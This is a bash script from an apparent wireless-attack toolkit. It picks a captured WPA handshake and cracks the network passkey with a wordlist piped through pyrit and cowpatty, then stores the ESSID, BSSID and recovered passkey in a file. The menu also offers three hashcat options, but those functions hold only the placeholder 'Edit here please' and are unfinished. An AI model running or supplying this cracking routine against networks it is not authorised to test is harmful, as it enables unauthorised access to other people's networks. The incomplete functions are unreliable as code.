#!/bin/bash

RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)
BLUE=$(tput setaf 6 && tput bold)

Choose_Capture_File(){

while true
do

clear
Available_Capture_Files=$(ls -l /usr/share/FS3/Captured_Handshakes | sed '/total/d'| rev | awk '{ print $1 }' | rev)
Capture_File_List=$(echo "$Available_Capture_Files" | nl -ba -w 1 -s ': ')
clear
echo $RED"Available Capture Files."
echo "########################"$STAND
echo ""
echo "$Capture_File_List"
echo ""
echo $RED"################################"
echo "# $GREEN[q]$BLUE = Clean & Exit Script    $RED#"
echo "################################"$STAND
read -p $GREEN"Please input the number of your chosen capture file:$STAND " Capture_File_Options

case $Capture_File_Options in
1|2|3|4|5|6|7|8|9|1*|2*|3*|4*|5*|6*|7*|8*|9*|q)
break ;;
*) echo "Input was incorrect, please re-choose an option." ;;
esac
done

if [[ $Capture_File_Options == "q" ]]; then
   Cleanup_And_Exit
fi

AP_Folder=$(echo "$Capture_File_List" | sed -n ""$Capture_File_Options"p" | sed -e 's/^...//g')
Capture_File=$(echo "$AP_Folder.cap")

cp -r /usr/share/FS3/Captured_Handshakes/$AP_Folder /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking
cp -r /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Folder/AP_Name.txt /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking
AP_Name=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/AP_Name.txt)
cp /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/AP_Name.txt /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name
echo $Capture_File > /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/Capture_File.txt

}

Attack_Method_Menu(){

while true
do

clear
echo $RED"################################"
echo "#$GREEN [1]$BLUE = Attack using a wordlist  $RED#"
echo "#$GREEN [2]$BLUE = Attack using hashcat     $RED#"
echo "#$GREEN [3]$BLUE = Attack using oclhashcat  $RED#"
echo "#$GREEN [4]$BLUE = Attack using cudahashcat $RED#"
echo "#$GREEN [q]$BLUE = Exit Script              $RED#"
echo "################################"$STAND
echo ""
read -p $GREEN"Please choose an option:$STAND " Attack_Method_Options

case $Attack_Method_Options in
1|2|3|4|q)
break ;;
*) echo "Input was incorrect, please re-choose an option." ;;
esac
done

if [[ $Attack_Method_Options == "1" ]]; then
   Choose_Capture_File
   Wordlist_Method
fi

if [[ $Attack_Method_Options == "2" ]]; then
   Choose_Capture_File
   hashcat
fi

if [[ $Attack_Method_Options == "3" ]]; then
   Choose_Capture_File
   oclhashcat
fi

if [[ $Attack_Method_Options == "4" ]]; then
   Choose_Capture_File
   cudahashcat
fi

if [[ $Attack_Method_Options == "q" ]]; then
   exit
fi
}

Wordlist_Method(){

AP_Name=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/AP_Name.txt)
Capture_File=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/Capture_File.txt)
AP_essid=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/essid.txt | sed -e 's/+/ /g')
AP_bssid=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/bssid.txt)

clear
read -p $GREEN"Drag and drop a wordlist onto this screen, or manually input the name and location$STAND: " Wordlist
echo $Wordlist > /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/WordlistNameLocation.txt
sed -i "s/'//g" /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/WordlistNameLocation.txt

Wordlist=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/WordlistNameLocation.txt)

clear
echo "cat $Wordlist | pyrit -e "$AP_essid" -i - -o - passthrough | cowpatty -d - -r /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/$Capture_File -s "$AP_essid""
echo ""
read -p $GREEN"Press [Enter] to start the attack.$STAND"

clear
cat $Wordlist | pyrit -e "$AP_essid" -i - -o - passthrough | cowpatty -d - -r /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/$Capture_File -s "$AP_essid" | tee /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/Wordlist_Attack.txt

Passkey_Check=$(grep "The PSK is" /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/Wordlist_Attack.txt)
if [[ $Passkey_Check ]]; then

   Passkey1=$(echo $Passkey_Check | sed -e 's/\.//g' -e 's/"//g' -e 's/The PSK is//g' -e 's/ //g')
   clear
   echo $RED"The recovered passkey will be coppied to$STAND /usr/share/FS3/Passkeys/"$AP_Name".txt"
   echo ""
   read -p $GREEN"Press [Enter] to store the passkey and return to the main menu.$STAND"
   echo 'ESSID: '$AP_essid'' > /usr/share/FS3/Passkeys/"$AP_Name".txt
   echo 'BSSID: '$AP_bssid'' >> /usr/share/FS3/Passkeys/"$AP_Name".txt
   echo 'Passkey: '$Passkey1'' >> /usr/share/FS3/Passkeys/"$AP_Name".txt
else

   clear
   echo $RED"Sorry but the passkey wasn't found."$STAND
   read -p $GREEN"Press [Enter] to finish.$STAND"
fi

rm -r /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name &> /dev/null
rm /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/AP_Name.txt &> /dev/null

exit
}

hashcat(){

AP_Name=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/AP_Name.txt)
Capture_File=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/Capture_File.txt)
AP_essid=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/essid.txt | sed -e 's/+/ /g')
AP_bssid=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/bssid.txt)


Edit here please



Passkey_Check=$(grep "The PSK is" /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/Wordlist_Attack.txt)
if [[ $Passkey_Check ]]; then

   Passkey1=$(echo $Passkey_Check | sed -e 's/\.//g' -e 's/"//g' -e 's/The PSK is//g' -e 's/ //g')
   clear
   echo $RED"The recovered passkey will be coppied to$STAND /usr/share/FS3/Passkeys/"$AP_Name".txt"
   echo ""
   read -p $GREEN"Press [Enter] to store the passkey and return to the main menu.$STAND"
   echo 'ESSID: '$AP_essid'' > /usr/share/FS3/Passkeys/"$AP_Name".txt
   echo 'BSSID: '$AP_bssid'' >> /usr/share/FS3/Passkeys/"$AP_Name".txt
   echo 'Passkey: '$Passkey1'' >> /usr/share/FS3/Passkeys/"$AP_Name".txt
else

   clear
   echo $RED"Sorry but the passkey wasn't found."$STAND
   read -p $GREEN"Press [Enter] to finish.$STAND"
fi

rm -r /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name &> /dev/null
rm /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/AP_Name.txt &> /dev/null

exit
}

oclhashcat(){

AP_Name=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/AP_Name.txt)
Capture_File=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/Capture_File.txt)
AP_essid=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/essid.txt | sed -e 's/+/ /g')
AP_bssid=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/bssid.txt)


Edit here please



Passkey_Check=$(grep "The PSK is" /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/Wordlist_Attack.txt)
if [[ $Passkey_Check ]]; then

   Passkey1=$(echo $Passkey_Check | sed -e 's/\.//g' -e 's/"//g' -e 's/The PSK is//g' -e 's/ //g')
   clear
   echo $RED"The recovered passkey will be coppied to$STAND /usr/share/FS3/Passkeys/"$AP_Name".txt"
   echo ""
   read -p $GREEN"Press [Enter] to store the passkey and return to the main menu.$STAND"
   echo 'ESSID: '$AP_essid'' > /usr/share/FS3/Passkeys/"$AP_Name".txt
   echo 'BSSID: '$AP_bssid'' >> /usr/share/FS3/Passkeys/"$AP_Name".txt
   echo 'Passkey: '$Passkey1'' >> /usr/share/FS3/Passkeys/"$AP_Name".txt
else

   clear
   echo $RED"Sorry but the passkey wasn't found."$STAND
   read -p $GREEN"Press [Enter] to finish.$STAND"
fi

rm -r /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name &> /dev/null
rm /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/AP_Name.txt &> /dev/null

exit
}

cudahashcat(){

AP_Name=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/AP_Name.txt)
Capture_File=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/Capture_File.txt)
AP_essid=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/essid.txt | sed -e 's/+/ /g')
AP_bssid=$(cat /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/bssid.txt)


Edit here please



Passkey_Check=$(grep "The PSK is" /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name/Wordlist_Attack.txt)
if [[ $Passkey_Check ]]; then

   Passkey1=$(echo $Passkey_Check | sed -e 's/\.//g' -e 's/"//g' -e 's/The PSK is//g' -e 's/ //g')
   clear
   echo $RED"The recovered passkey will be coppied to$STAND /usr/share/FS3/Passkeys/"$AP_Name".txt"
   echo ""
   read -p $GREEN"Press [Enter] to store the passkey and return to the main menu.$STAND"
   echo 'ESSID: '$AP_essid'' > /usr/share/FS3/Passkeys/"$AP_Name".txt
   echo 'BSSID: '$AP_bssid'' >> /usr/share/FS3/Passkeys/"$AP_Name".txt
   echo 'Passkey: '$Passkey1'' >> /usr/share/FS3/Passkeys/"$AP_Name".txt
else

   clear
   echo $RED"Sorry but the passkey wasn't found."$STAND
   read -p $GREEN"Press [Enter] to finish.$STAND"
fi

rm -r /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/$AP_Name &> /dev/null
rm /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/AP_Name.txt &> /dev/null

exit
}

if [ "$(ls -A /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking)" ]; then
   if [ -z "$(pgrep Attack_Capture_Files)" ]; then
      rm -r /usr/share/FS3/Temp_Working_Dirctory/Handshake_Cracking/* &> /dev/null

   fi
fi

Attack_Method_Menu
